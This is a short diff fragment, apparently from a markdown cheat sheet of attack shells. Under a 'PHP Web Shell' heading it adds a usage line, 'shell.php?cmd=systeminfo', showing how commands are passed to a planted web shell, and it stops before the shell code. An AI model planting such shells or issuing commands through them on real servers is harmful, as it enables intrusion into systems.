@@ -22,6 +22,11 @@ code:
 ```
 
 ## PHP Web Shell
+usage:
+```
+shell.php?cmd=systeminfo
+```
+code:
 ```
 <html>
 <body>
